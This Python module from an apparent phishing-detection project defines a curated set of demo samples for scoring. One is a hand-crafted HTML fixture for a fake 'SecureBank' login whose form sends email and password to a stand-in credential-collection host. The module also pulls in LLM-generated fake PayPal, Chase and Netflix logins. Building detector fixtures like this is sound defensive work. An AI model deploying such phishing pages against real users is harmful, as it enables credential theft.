"""The curated demo set the API and extension operate over.

Per the project brief's Phase 6 scope, the demo is NOT a live crawler: it
never fetches or analyzes an arbitrary page the user happens to be on. It
only ever scores one of these fixed, pre-loaded samples (or a
caller-supplied precomputed feature dict — see `phishshield.api.app`).
"""

from __future__ import annotations

from dataclasses import dataclass

from phishshield.data.generation import generate_llm_phishing_dataset
from phishshield.data.schema import Sample, Source

_HANDCRAFTED_PHISHING_HTML = """<!DOCTYPE html>
<html>
<head>
  <title>SecureBank - Verify Your Account</title>
  <script src="https://collect-creds.exfil-drop.ru/track.js"></script>
</head>
<body>
  <div style="display:none">hidden tracking pixel</div>
  <h1>SecureBank Account Verification</h1>
  <p>Unusual activity was detected. Confirm your details to avoid suspension.</p>
  <form action="https://collect-creds.exfil-drop.ru/collect" method="POST">
    <input type="email" name="email" placeholder="Email" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Verify</button>
  </form>
</body>
</html>
"""

_BENIGN_LANDING_HTML = """<!DOCTYPE html>
<html>
<head><title>Example Domain</title></head>
<body>
  <h1>Example Domain</h1>
  <p>This domain is for use in illustrative examples in documents.</p>
  <a href="https://www.iana.org/domains/example">More information...</a>
</body>
</html>
"""

_BENIGN_ARTICLE_HTML = """<!DOCTYPE html>
<html>
<head><title>Weekly Trail Report — Ridgeline Hiking Club</title></head>
<body>
  <h1>Weekly Trail Report</h1>
  <p>Conditions on the north loop are dry; the creek crossing is passable
  without waders this week. Next group hike meets Saturday at 8am.</p>
</body>
</html>
"""


@dataclass(frozen=True)
class DemoSample:
    id: str
    display_name: str
    sample: Sample


def _pick(samples: list[Sample], brand_key: str) -> Sample:
    return next(s for s in samples if s.brand_target == brand_key)


def _build_curated_demo_samples() -> list[DemoSample]:
    llm_samples = generate_llm_phishing_dataset()
    return [
        DemoSample(
            id="phishing-paypal-llm",
            display_name="Fake PayPal login (LLM-generated)",
            sample=_pick(llm_samples, "paypal"),
        ),
        DemoSample(
            id="phishing-chase-llm",
            display_name="Fake Chase Bank login (LLM-generated)",
            sample=_pick(llm_samples, "chase"),
        ),
        DemoSample(
            id="phishing-netflix-llm",
            display_name="Fake Netflix login (LLM-generated)",
            sample=_pick(llm_samples, "netflix"),
        ),
        DemoSample(
            id="phishing-handcrafted",
            display_name="Fake SecureBank login (hand-crafted)",
            sample=Sample(
                url="https://securebank-verify-account.top/secure/confirm",
                label=1,
                source=Source.PHISHTANK,
                html=_HANDCRAFTED_PHISHING_HTML,
                brand_target="securebank",
            ),
        ),
        DemoSample(
            id="benign-landing",
            display_name="Example.com landing page (benign)",
            sample=Sample(
                url="https://example.com/",
                label=0,
                source=Source.TRANCO,
                html=_BENIGN_LANDING_HTML,
            ),
        ),
        DemoSample(
            id="benign-article",
            display_name="Hiking club trail report (benign)",
            sample=Sample(
                url="https://ridgelinehikingclub.org/news/weekly-trail-report",
                label=0,
                source=Source.TRANCO,
                html=_BENIGN_ARTICLE_HTML,
            ),
        ),
    ]


CURATED_DEMO_SAMPLES: list[DemoSample] = _build_curated_demo_samples()
_DEMO_SAMPLES_BY_ID = {d.id: d for d in CURATED_DEMO_SAMPLES}


def get_demo_sample(sample_id: str) -> DemoSample:
    """Look up a curated demo sample by id.

    Raises KeyError if `sample_id` isn't one of `CURATED_DEMO_SAMPLES` —
    the API layer turns that into a 404 rather than silently falling back
    to something else.
    """
    return _DEMO_SAMPLES_BY_ID[sample_id]
